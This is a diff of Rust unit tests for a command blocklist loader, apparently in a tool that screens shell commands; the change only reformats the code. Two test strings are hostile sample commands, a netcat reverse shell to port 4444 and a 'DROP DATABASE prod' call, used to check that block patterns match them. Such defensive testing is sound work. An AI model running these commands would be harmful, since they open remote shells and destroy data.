@@ -301,8 +301,16 @@ mod tests {
         assert_eq!(loaded.patterns[1].source, "skill");
         assert!(loaded.patterns[1].reason.starts_with("skill:dbadmin:"));
         // Patterns actually match.
-        assert!(loaded.patterns[0].regex.is_match("nc -e /bin/sh 10.0.0.1 4444"));
-        assert!(loaded.patterns[1].regex.is_match("psql -c 'DROP DATABASE prod'"));
+        assert!(
+            loaded.patterns[0]
+                .regex
+                .is_match("nc -e /bin/sh 10.0.0.1 4444")
+        );
+        assert!(
+            loaded.patterns[1]
+                .regex
+                .is_match("psql -c 'DROP DATABASE prod'")
+        );
     }
 
     #[test]
@@ -356,11 +364,7 @@ mod tests {
     fn load_from_explicit_path_works() {
         let dir = temp_dir();
         let path = dir.join(BLOCKLIST_CONFIG_FILE);
-        std::fs::write(
-            &path,
-            r#"{"patterns":[{"regex":"foo","reason":"bar"}]}"#,
-        )
-        .unwrap();
+        std::fs::write(&path, r#"{"patterns":[{"regex":"foo","reason":"bar"}]}"#).unwrap();
         let cfg = BlocklistConfig::load_from_path(&path).unwrap();
         assert_eq!(cfg.patterns.len(), 1);
         let _ = std::fs::remove_dir_all(&dir);
